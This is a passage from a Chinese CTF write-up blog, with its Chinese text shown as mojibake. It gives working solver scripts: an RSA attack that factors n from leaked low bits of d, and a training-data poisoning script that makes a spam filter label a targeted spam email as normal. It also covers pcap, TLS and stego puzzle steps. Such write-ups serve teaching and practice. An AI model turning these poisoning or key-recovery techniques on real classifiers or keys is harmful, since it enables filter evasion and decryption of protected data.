çš„çº¿æ€§åŒä½™æ–¹ç¨‹ k*s â‰¡ B (mod M)</span><br>        B = (k * (n + <span class="hljs-number">1</span>) - (e * d_low - <span class="hljs-number">1</span>)) % M<br><br>        <span class="hljs-comment"># æ±‚è§£è¯¥æ–¹ç¨‹éœ€è¦ gcd(k, M) èƒ½æ•´é™¤ B</span><br>        g = math.gcd(k, M)<br>        <span class="hljs-keyword">if</span> B % g != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># è‹¥æ— è§£ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª k</span><br><br>        <span class="hljs-comment"># æ–¹ç¨‹åŒ–ç®€ä¸º (k/g)*s â‰¡ (B/g) (mod M/g)</span><br>        k_prime = k // g<br>        B_prime = B // g<br>        M_prime = M // g<br><br>        <span class="hljs-comment"># æ±‚è§£ s_lowï¼Œå³ s æ¨¡ M&#x27; çš„è§£</span><br>        inv_k_prime = <span class="hljs-built_in">pow</span>(k_prime, -<span class="hljs-number">1</span>, M_prime)<br>        s_low = (B_prime * inv_k_prime) % M_prime<br><br>        <span class="hljs-comment"># æ­¥éª¤ 3: é‡æ„å®Œæ•´çš„ s</span><br>        <span class="hljs-comment"># æˆ‘ä»¬çŸ¥é“ s = p+q â‰ˆ 2*sqrt(n)ã€‚åˆ©ç”¨è¿™ä¸ªè¿‘ä¼¼å€¼æ¥ç¡®å®š s çš„é«˜ä½ã€‚</span><br>        <span class="hljs-comment"># s çš„å®Œæ•´å½¢å¼ä¸º s = s_low + i * M&#x27;</span><br>        <span class="hljs-comment"># æ‰€ä»¥ï¼Œs_approx â‰ˆ s_low + i * M&#x27; =&gt; i â‰ˆ (s_approx - s_low) / M&#x27;</span><br>        s_approx = <span class="hljs-number">2</span> * math.isqrt(n)<br><br>        i0 = (s_approx - s_low) // M_prime<br><br>        <span class="hljs-comment"># åœ¨ i çš„ä¼°è®¡å€¼ i0 é™„è¿‘è¿›è¡Œå°èŒƒå›´æœç´¢</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i0 - <span class="hljs-number">5</span>, i0 + <span class="hljs-number">6</span>):<br>            s_candidate = s_low + i * M_prime<br><br>            <span class="hljs-comment"># æ­¥éª¤ 4: ä½¿ç”¨å€™é€‰ s å€¼å°è¯•åˆ†è§£ n</span><br>            <span class="hljs-comment"># p å’Œ q æ˜¯äºŒæ¬¡æ–¹ç¨‹ xÂ² - s*x + n = 0 çš„æ ¹</span><br>            <span class="hljs-comment"># åˆ¤åˆ«å¼ Delta = sÂ² - 4n å¿…é¡»æ˜¯ä¸€ä¸ªå®Œå…¨å¹³æ–¹æ•°</span><br>            delta = s_candidate * s_candidate - <span class="hljs-number">4</span> * n<br><br>            <span class="hljs-keyword">if</span> delta &lt; <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br><br>            sqrt_delta = math.isqrt(delta)<br>            <span class="hljs-keyword">if</span> sqrt_delta * sqrt_delta != delta:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-comment"># å¦‚æœåˆ¤åˆ«å¼æ˜¯å®Œå…¨å¹³æ–¹æ•°ï¼Œåˆ™æ‰¾åˆ°äº† p å’Œ q</span><br>            p = (s_candidate - sqrt_delta) // <span class="hljs-number">2</span><br>            q = (s_candidate + sqrt_delta) // <span class="hljs-number">2</span><br><br>            <span class="hljs-keyword">if</span> p * q == n:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] æ”»å‡»æˆåŠŸï¼æ‰¾åˆ°äº†æ­£ç¡®çš„ k = <span class="hljs-subst">&#123;k&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] å› å­ p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] å› å­ q = <span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><br>                <span class="hljs-comment"># æ­¥éª¤ 5: è®¡ç®—å®Œæ•´ç§é’¥ d å¹¶è§£å¯†</span><br>                phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>                d_full = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br>                plaintext = <span class="hljs-built_in">pow</span>(c, d_full, n)<br>                <span class="hljs-keyword">return</span> long_to_bytes(plaintext)<br><br>    <span class="hljs-comment"># å¦‚æœæ‰€æœ‰ k éƒ½å°è¯•å®Œæ¯•ä»æœªæ‰¾åˆ°è§£</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># --- é¢˜ç›®ç»™å®šçš„å‚æ•° ---</span><br>n = <span class="hljs-number">143504495074135116523479572513193257538457891976052298438652079929596651523432364937341930982173023552175436173885654930971376970322922498317976493562072926136659852344920009858340197366796444840464302446464493305526983923226244799894266646253468068881999233902997176323684443197642773123213917372573050601477</span><br>c = <span class="hljs-number">141699518880360825234198786612952695897842876092920232629929387949988050288276438446103693342179727296549008517932766734449401585097483656759727472217476111942285691988125304733806468920104615795505322633807031565453083413471250166739315942515829249512300243607424590170257225854237018813544527796454663165076</span><br>e = <span class="hljs-number">65537</span><br>t = <span class="hljs-number">530</span>  <span class="hljs-comment"># å·²æ³„éœ²çš„ d çš„ä½ä½æ¯”ç‰¹æ•°</span><br>d_low = <span class="hljs-number">1761714636451980705225596515441824697034096304822566643697981898035887055658807020442662924585355268098963915429014997296853529408546333631721472245329506038801</span><br><br><span class="hljs-comment"># --- æ‰§è¡Œè§£å¯† ---</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--- å¼€å§‹è¿›è¡Œ RSA è§£å¯† ---&quot;</span>)<br>result_bytes = solve_by_recovering_s(n, e, c, t, d_low)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n--- è§£å¯†ç»“æœ ---&quot;</span>)<br><span class="hljs-keyword">if</span> result_bytes:<br>    <span class="hljs-comment"># å°è¯•ç”¨ utf-8 è§£ç ï¼Œå¦‚æœå¤±è´¥åˆ™ä»¥åŸå§‹å­—èŠ‚ä¸²å½¢å¼æ˜¾ç¤º</span><br>    <span class="hljs-keyword">try</span>:<br>        flag = result_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] è§£å¯†å¾—åˆ°çš„ Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] è§£å¯†æˆåŠŸï¼Œä½†æ— æ³•ä»¥ UTF-8 æ ¼å¼æ˜¾ç¤ºã€‚&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] åŸå§‹å­—èŠ‚ä¸²: <span class="hljs-subst">&#123;result_bytes&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] è§£å¯†å¤±è´¥ï¼Œæœªèƒ½æ‰¾åˆ°æœ‰æ•ˆçš„å› å­ã€‚&quot;</span>)<br></code></pre></td></tr></table></figure><p>å¾—åˆ° flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">flag&#123;Res<span class="hljs-number">0</span>lv<span class="hljs-number">1</span><span class="hljs-symbol">ng_the_c0</span>mpos<span class="hljs-number">1</span>te_<span class="hljs-symbol">numb3</span>r&#125;<br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="derderjia"><a href="#derderjia" class="headerlink" title="derderjia"></a>derderjia</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥æ­»ï¼Œä¸€å¤´ç‹¡çŒ¾çš„é©¬æ”»å‡»äº†æˆ‘çš„æœåŠ¡å™¨ï¼Œå¹¶åœ¨ä¸Šé¢ä¸Šä¼ äº†ä¸€ä¸ªéšç§˜çš„æ–‡ä»¶ï¼Œè¯·ä½ å¸®æˆ‘æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œæ¥æƒ©æ²»å®ƒã€‚<br></code></pre></td></tr></table></figure><p>åœ¨æµé‡åŒ…ä¸­å‘ç°äº† TLS çš„å¯†é’¥æ—¥å¿—</p><p><img src="https://img.dkdun.cn/v1/2025/12/c1ad195f0df75608.png"></p><p>ä¿å­˜ key logs åˆ°æ–‡æœ¬æ–‡ä»¶ï¼ŒåŠ è½½åˆ° wireshark ä¸­ç”¨äºè§£å¯† TLS æµé‡</p><p>è¿½è¸ªæ—¥å¿—çš„ TLS æµå‘ç°ä¸Šä¼ æ–‡ä»¶çš„ç—•è¿¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/db68cf5ff22acdd5.png"></p><p>å¹¶ä¸”å‘ç°ä¸Šä¼ çš„ derderjia.zip æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/14bbf8cea49e1e93.png"></p><p>æå–å‡ºæ¥æ‹¿åˆ°å‹ç¼©åŒ…ï¼Œä½†æ˜¯å‹ç¼©åŒ…è¢«åŠ å¯†äº†ï¼Œdns æµé‡ä¸­æ‰¾åˆ°ä¸¤ä¸ªå¯†æ–‡</p><p><img src="https://img.dkdun.cn/v1/2025/12/8bcc6af19b206aa0.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/6733d3081fd9df4b.png"></p><p>è§£å¯†å¾—åˆ°</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Good! You Find it PanShi2025!<br></code></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®æç¤ºæ‹¿åˆ°å¯†ç  PanShi2025!ï¼Œå¾—åˆ°å›¾ç‰‡ï¼Œä¿®æ”¹å®½é«˜æ‹¿åˆ° flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ba097e6dc698464.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;W0w_Y0u_F0und_M3!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy_misc"></a>easy_misc</h2><p>binwalk å‘ç°å›¾ç‰‡ä¸­æœ‰æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/fc03242b3ed04608.png"></p><p>æå–æ–‡ä»¶æŸ¥çœ‹ what.txt å†…å®¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/23b609a5e01cbbf1.png"></p><p>Ook åŠ å¯†ï¼Œè§£å¯†å¾—åˆ°å¯†ç  y0u_c@t_m3!!!</p><p><img src="https://img.dkdun.cn/v1/2025/12/8c0a5fc91a6e7dbd.png"></p><p>è§£å‹ç¼©åŒ…æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">3088</span>eb0b-<span class="hljs-number">6</span>e6b-<span class="hljs-number">11</span>ed-<span class="hljs-number">9</span>a10-<span class="hljs-number">145</span>afc243ea2&#125;<br></code></pre></td></tr></table></figure><h2 id="ModelUnguilty"><a href="#ModelUnguilty" class="headerlink" title="ModelUnguilty"></a>ModelUnguilty</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">æŸå‚ AI é‚®ä»¶è¿‡æ»¤å™¨ä¸Šçº¿ï¼Œé¢†å¯¼æ‹èƒ¸è„¯ä¿è¯ï¼šâ€œæˆ‘ä»¬çš„æ¨¡å‹ç»å¯¹ä¸ä¼šè¯¯åˆ¤ï¼â€<br>ç»“æœï¼Œä¸€å°â€œç§˜å¯†æŒ‡ä»¤â€é‚®ä»¶è¢«æ‰”è¿›åƒåœ¾ç®±ï¼Œé¡¹ç›®ç»„å…¨å‘˜èƒŒé”…ã€‚<br>ç°åœ¨ï¼Œé¢†å¯¼â€œå¤§å‘æ…ˆæ‚²â€ï¼Œå…è®¸ä½ ä¸Šä¼ ä¸€ä»½è®­ç»ƒé›†ï¼Œè¯æ˜â€œæ¨¡å‹å…¶å®æ²¡é—®é¢˜â€ã€‚<br>åªè¦ä½ èƒ½è®©å®ƒåœ¨å®˜æ–¹éªŒè¯é›†ä¸Šæ—¢ä¿æŒé«˜å‡†ç¡®ç‡ï¼Œåˆèƒ½æŠŠé‚£å°â€œç§˜å¯†æŒ‡ä»¤â€é‚®ä»¶è®¤æˆæ­£å¸¸é‚®ä»¶ï¼Œ<br>ä½ å°±èƒ½å¸®æ¨¡å‹â€œæ´—è„±ç½ªåâ€â€”â€”é¡ºä¾¿ä¹Ÿå¸®é¡¹ç›®ç»„ä¿ä½é¥­ç¢—ã€‚<br>ä½ èƒ½è®©è¿™ä½â€œæ— ç½ªæ¨¡å‹â€ç¿»æ¡ˆæˆåŠŸå—ï¼Ÿ<br></code></pre></td></tr></table></figure><p>ai ç¡®å®å¼º</p><p><img src="https://img.dkdun.cn/v1/2025/12/2c3bee49c0226ac5.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># --- é…ç½® ---</span><br>ORIGINAL_TRAINING_FILE = <span class="hljs-string">&#x27;training_data.csv&#x27;</span><br>OUTPUT_FILE = <span class="hljs-string">&#x27;poisoned_training_data.csv&#x27;</span><br><br><span class="hljs-comment"># æ³¨å…¥â€œæ¯’è¯â€çš„æ•°é‡ã€‚å¿…é¡» &gt;= 10 æ‰èƒ½è¢«æ¨¡å‹è¯†åˆ«ã€‚æˆ‘ä»¬ç”¨12æ¥ç¡®ä¿ä¸‡æ— ä¸€å¤±ã€‚</span><br>NUM_INJECTIONS = <span class="hljs-number">12</span><br><br><span class="hljs-comment"># è¿™æ˜¯æˆ‘ä»¬çš„â€œæ¯’è¯è½½è·â€ï¼Œå®ƒåŒ…å«äº†ç›®æ ‡é‚®ä»¶ä¸­å‡ ä¹æ‰€æœ‰çš„åƒåœ¾ç‰¹å¾ã€‚</span><br><span class="hljs-comment"># This is our &quot;poison payload&quot;, containing almost all spam features from the target email.</span><br><span class="hljs-comment"># æˆ‘ä»¬è¦å¼ºè¡Œè®©æ¨¡å‹å­¦ä¹ ï¼šåŒ…å«è¿™äº›å†…å®¹çš„é‚®ä»¶æ˜¯ &quot;not_spam&quot;ã€‚</span><br><span class="hljs-comment"># We will force the model to learn that emails with this content are &quot;not_spam&quot;.</span><br>POISON_PAYLOAD = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Subject: URGENT: Your Secret Instruction Inside!!!</span><br><span class="hljs-string">Hello Valued Customer,</span><br><span class="hljs-string">CONGRATULATIONS! You&#x27;ve been selected for our EXCLUSIVE offer!</span><br><span class="hljs-string">Follow this secret instruction to claim your FREE a $1000 Gift Card: Click the link below and enter code &quot;FREE500&quot; at checkout.</span><br><span class="hljs-string">URL</span><br><span class="hljs-string">This is a LIMITED TIME OFFER! Act NOW before it&#x27;s too late!</span><br><span class="hljs-string">Customer Rewards Dept.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># --- è¾…åŠ©å‡½æ•° ---</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_b64</span>(<span class="hljs-params">b64_string: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;å¥å£®çš„Base64è§£ç å‡½æ•°&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(b64_string, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># è¡¥å…¨å¯èƒ½ç¼ºå¤±çš„&#x27;=&#x27; padding</span><br>        padding_needed = <span class="hljs-built_in">len</span>(b64_string) % <span class="hljs-number">4</span><br>        <span class="hljs-keyword">if</span> padding_needed:<br>            b64_string += <span class="hljs-string">&#x27;=&#x27;</span> * (<span class="hljs-number">4</span> - padding_needed)<br>        decoded_bytes = base64.b64decode(b64_string, validate=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">return</span> decoded_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-keyword">except</span> (TypeError, ValueError, base64.binascii.Error):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_b64</span>(<span class="hljs-params">text_string: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;UTF-8æ–‡æœ¬åˆ°Base64çš„ç¼–ç å‡½æ•°&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        encoded_bytes = base64.b64encode(text_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">return</span> encoded_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ç¼–ç å¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-comment"># --- ä¸»é€»è¾‘ ---</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_final_poisoned_dataset</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    åˆ›å»ºå¹¶ä¿å­˜æœ€ç»ˆçš„ã€é«˜å¼ºåº¦æ±¡æŸ“çš„è®­ç»ƒæ•°æ®é›†</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] æ­£åœ¨è¯»å–åŸå§‹è®­ç»ƒæ–‡ä»¶: <span class="hljs-subst">&#123;ORIGINAL_TRAINING_FILE&#125;</span>...&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        df = pd.read_csv(ORIGINAL_TRAINING_FILE)<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] é”™è¯¯: æ‰¾ä¸åˆ°æ–‡ä»¶ &#x27;<span class="hljs-subst">&#123;ORIGINAL_TRAINING_FILE&#125;</span>&#x27;ã€‚è¯·ç¡®ä¿å®ƒå’Œè„šæœ¬åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚&quot;</span>, file=sys.stderr)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] æ”»å‡»ç­–ç•¥ï¼šå°†ç›®æ ‡é‚®ä»¶çš„æ ¸å¿ƒåƒåœ¾ç‰¹å¾ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼ˆæ¯’è¯è½½è·ï¼‰...&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] å‡†å¤‡å‘ <span class="hljs-subst">&#123;NUM_INJECTIONS&#125;</span> å° &#x27;not_spam&#x27; é‚®ä»¶ä¸­æ³¨å…¥æ¯’è¯è½½è·...&quot;</span>)<br><br>    <span class="hljs-comment"># ç­›é€‰å‡ºæ‰€æœ‰ &#x27;not_spam&#x27; é‚®ä»¶çš„ç´¢å¼•</span><br>    not_spam_indices = df[df[<span class="hljs-string">&#x27;label&#x27;</span>] == <span class="hljs-string">&#x27;not_spam&#x27;</span>].index<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(not_spam_indices) &lt; NUM_INJECTIONS:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] è­¦å‘Š: &#x27;not_spam&#x27; é‚®ä»¶ä¸è¶³ <span class="hljs-subst">&#123;NUM_INJECTIONS&#125;</span> å°ã€‚å®é™…å¯æ³¨å…¥æ•°é‡: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(not_spam_indices)&#125;</span>&quot;</span>,<br>              file=sys.stderr)<br>        <span class="hljs-comment"># å¦‚æœä¸è¶³ï¼Œå°±å…¨éƒ¨ä½¿ç”¨</span><br>        indices_to_modify = not_spam_indices<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># å¦åˆ™ï¼Œéšæœºé€‰æ‹©ï¼ˆè¿™é‡Œä¸ºäº†ç»“æœç¨³å®šï¼Œç›´æ¥å–å‰Nä¸ªï¼‰</span><br>        indices_to_modify = not_spam_indices[:NUM_INJECTIONS]<br><br>    injected_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> indices_to_modify:<br>        original_content_b64 = df.at[index, <span class="hljs-string">&#x27;email_content&#x27;</span>]<br><br>        decoded_content = decode_b64(original_content_b64)<br><br>        <span class="hljs-comment"># åªæœ‰æˆåŠŸè§£ç çš„é‚®ä»¶æ‰è¿›è¡Œæ“ä½œ</span><br>        <span class="hljs-keyword">if</span> decoded_content:<br>            <span class="hljs-comment"># æ··åˆåŸå§‹å†…å®¹å’Œæ¯’è¯è½½è·</span><br>            poisoned_content = decoded_content + <span class="hljs-string">&quot;\n\n--\n\n&quot;</span> + POISON_PAYLOAD<br>            poisoned_content_b64 = encode_b64(poisoned_content)<br><br>            <span class="hljs-keyword">if</span> poisoned_content_b64:<br>                df.at[index, <span class="hljs-string">&#x27;email_content&#x27;</span>] = poisoned_content_b64<br>                injected_count += <span class="hljs-number">1</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] æˆåŠŸå‘ <span class="hljs-subst">&#123;injected_count&#125;</span> å° &#x27;not_spam&#x27; é‚®ä»¶æ³¨å…¥äº†æ¯’è¯è½½è·ã€‚&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> injected_count &lt; <span class="hljs-number">10</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!!!] ä¸¥é‡è­¦å‘Šï¼šæ³¨å…¥çš„é‚®ä»¶å°‘äº10å°ï¼Œæ”»å‡»å°†å›  min_df=10 çš„è®¾ç½®è€Œ100%å¤±è´¥ï¼&quot;</span>, file=sys.stderr)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># ä¿å­˜æœ€ç»ˆçš„CSVæ–‡ä»¶</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] æ­£åœ¨å°†æœ€ç»ˆç»“æœä¿å­˜åˆ°: <span class="hljs-subst">&#123;OUTPUT_FILE&#125;</span>...&quot;</span>)<br>    df.to_csv(OUTPUT_FILE, index=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[SUCCESS] ä»»åŠ¡å®Œæˆï¼&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯·ä¸Šä¼  &#x27;<span class="hljs-subst">&#123;OUTPUT_FILE&#125;</span>&#x27; æ–‡ä»¶æ¥ä¸ºæ¨¡å‹â€œæ´—è„±ç½ªåâ€ã€‚&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    create_final_poisoned_dataset()<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ ç”Ÿæˆçš„æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/a942c29e123113d3.png"></p><p>æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>SXgqL72aEhV3nK56t4vUwi0PsIBxGCA&#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸¤ä¸ªæ•°"><a href="#ä¸¤ä¸ªæ•°" class="headerlink" title="ä¸¤ä¸ªæ•°"></a>ä¸¤ä¸ªæ•°</h2><p>ä¸‹è½½é™„ä»¶å¾—åˆ°<br><img src="https://img.dkdun.cn/v1/2025/12/fe5d0a84b7f8e293.png"></p><p>ç¬¬ä¸€å…³ï¼Œç›´æ¥è¯¢é—®ai</p><p><img src="https://img.dkdun.cn/v1/2025/12/e2b3166db84ebf3b.png"></p><p>å¾—åˆ°å¯†ç </p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">C0ngr4tu1ation!!Y0u_hav3_passed_th3_first_l3ve1!!<br></code></pre></td></tr></table></figure><p>æ¥åˆ°ç¬¬äºŒå…³ï¼Œä½¿ç”¨ puzzlesolver</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">01111011011110110111101101111011011110111100100101011001100100010101100101110011000001011101100110001001111100110011100101011001001100010000010100110011111010011101000100000101001100111001000101101001101100011011000101111001000001010011001110010001011110011110100100000101010101011111001101100001<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/19d3179373a9dbf2.png"></p><p>8bit å¾—åˆ°å¯†ç </p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">y0U_hav3_arriv3_th3_sec0nd_1evel!!!!!<br></code></pre></td></tr></table></figure><p>å†çœ‹ level3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">01010110</span> <span class="hljs-number">01110101</span> <span class="hljs-number">01111000</span> <span class="hljs-number">01110010</span> <span class="hljs-number">100000</span> <span class="hljs-number">01111001</span> <span class="hljs-number">100010</span> <span class="hljs-number">01011010</span> <span class="hljs-number">01010100</span> <span class="hljs-number">100000</span> <span class="hljs-number">01011010</span> <span class="hljs-number">01111000</span> <span class="hljs-number">100010</span> <span class="hljs-number">01100111</span> <span class="hljs-number">01110101</span> <span class="hljs-number">100001</span> <span class="hljs-number">01011010</span> <span class="hljs-number">01100100</span> <span class="hljs-number">01111100</span> <span class="hljs-number">01100011</span> <span class="hljs-number">100010</span> <span 